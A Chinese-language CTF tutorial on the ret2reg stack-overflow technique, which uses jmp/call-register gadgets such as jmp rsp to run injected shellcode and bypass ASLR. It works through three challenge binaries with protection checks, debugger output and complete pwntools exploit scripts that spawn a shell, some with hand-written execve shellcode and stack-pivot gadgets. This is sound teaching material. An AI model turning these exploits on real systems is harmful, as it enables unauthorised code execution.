## 利用原理

ret2reg，即返回到寄存器地址进行攻击，可以绕过地址混淆（ASLR）。

一般用于开启`ASLR`的ret2shellcode题型，在函数执行后，传入的参数在栈中传给某寄存器，然而该函数在结束前并未将该寄存器复位，就导致这个寄存器仍还保存着参数，当这个参数是`shellcode`时，只要程序中存在`jmp/call reg`代码片段时，即可通过gadget跳转至该寄存器执行shellcode。

该攻击方法之所以能成功，是因为函数内部实现时，溢出的缓冲区地址通常会加载到某个寄存器上，在后来的运行过程中不会修改。

> 也就是说只要在函数`ret`之前将相关寄存器复位掉，便可以避免此漏洞。

## 利用思路

> 主要在于找到寄存器与缓冲区地址的确定性关系，然后从程序中搜索`call reg/jmp reg`这样的指令

1. 分析和调试汇编，查看溢出函数返回时哪个寄存值指向传入的shellcode
2. 查找`call reg`或`jmp reg`，将指令所在的地址填到EIP位置，即返回地址
3. 在`reg`指向的空间上注入shellcode


## 例题

>rsp_shellcode

**source**
```c
#include <stdio.h>

int test = 0;

int main() {
    char input[100];

    puts("Get me with shellcode and RSP!");
    gets(input);

    if(test) {
        asm("jmp *%rsp");
        return 0;
    }
    else {
        return 0;
    }
}
```

**查保护**

没有NX和canary以及PIE保护，即栈可执行。

```c
	Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```


**分析**

分析源代码发现很明显的栈溢出漏洞，并且溢出字节没有限制。

源代码中还内嵌了一个`jmp rsp`的汇编指令，猜测要通过ret2reg的方式打shellcode。

gdb调试发现在函数返回的时候`rsp`仍然指向缓冲区地址。

这样我们可以通过将返回地址即下面这条指令的地址覆盖为`jmp rsp`来让`rip`指向缓冲区，然后我们再发送shellcode让程序执行shellcode。

先执行`jmp rsp`再发送shellcode是因为程序可以溢出很长的字节，我们可以先将`rip`指向缓冲区然后再发送shellcode执行。

```c
*RSP  0x7fffffffcd78 —▸ 0x7ffff7da8d90 (__libc_start_call_main+128) ◂— mov edi, eax
```

**exp**
```python
#!/usr/bin/env python3
from pwncli import *
cli_script()

io: tube = gift.io
elf: ELF = gift.elf

jmp_rsp = next(elf.search(asm('jmp rsp')))

payload = flat(
    b'a' * 120,  
    jmp_rsp,      
    asm(shellcraft.sh())     
)
sla("RSP!\n",payload)
ia()
```

>X-CTF Quals 2016 - b0verfl0w


**查保护**
```c
	Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
```

**分析**

ida反编译的伪代码

程序限制读取50个字节，所以我们只能溢出18个字节，所以并不能进行上题的利用方法。

```c
int vul()
{
  char s[32]; // [esp+18h] [ebp-20h] BYREF

  puts("\n======================");
  puts("\nWelcome to X-CTF 2016!");
  puts("\n======================");
  puts("What's your name?");
  fflush(stdout);
  fgets(s, 50, stdin);
  printf("Hello %s.", s);
  fflush(stdout);
  return 1;
}
```

gdb动调调试发现`rsp`指向缓冲区。

```c
*ESP  0xffffbe4c —▸ 0x8048519 (main+11) ◂— leave
```

我们无法直接返回执行很长的shellcode，但是可以通过较短的汇编指令将栈帧进行一个迁移。

迁移到一个我们想要它执行的地方，比如payload的前部分。

**exp**
```python
#!/usr/bin/env python3
from pwncli import *
cli_script()

io: tube = gift.io
elf: ELF = gift.elf

shellcode=asm("""
push 0x68732f
push 0x6e69622f
mov ebx,esp
xor ecx,ecx
push 11
pop eax
int 0x80
""")

sub_esp_jmp = asm('sub esp, 0x28;jmp esp')

jmp_esp = 0x08048504
payload = shellcode + (0x20 - len(shellcode)) * b'a' + b'aaaa' + p32(jmp_esp) + sub_esp_jmp
sl(payload)

ia()
```

>\[广东省大学生攻防大赛 2022]jmp_rsp

**查保护**

```c
	Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```

**分析程序**

ida反编译
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char v3; // cl
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF

  printf("this is a classic pwn", argv, envp, v3);
  read(0, buf, 0x100uLL);
  return 0;
}
```

gdb动调调试发现rsp指向栈空间。

```c
*RSP  0x7fffffffcf68 —▸ 0x401119 (__libc_start_main+777) ◂— mov edi, eax
```

**exp**

```python
#!/usr/bin/env python3
from pwncli import *
cli_script()

io: tube = gift.io
elf: ELF = gift.elf

jmp_rsp = 0x0000000000459a37
payload = asm(shellcraft.sh()).ljust(0x88, b'\x00') + p64(jmp_rsp) + asm('sub rsp, 0x90; jmp rsp')
sl(payload)

ia()
```

## 后言

>参考链接：[Using RSP | Cybersec (gitbook.io)](https://ir0nstone.gitbook.io/notes/binexp/stack/reliable-shellcode/using-rsp)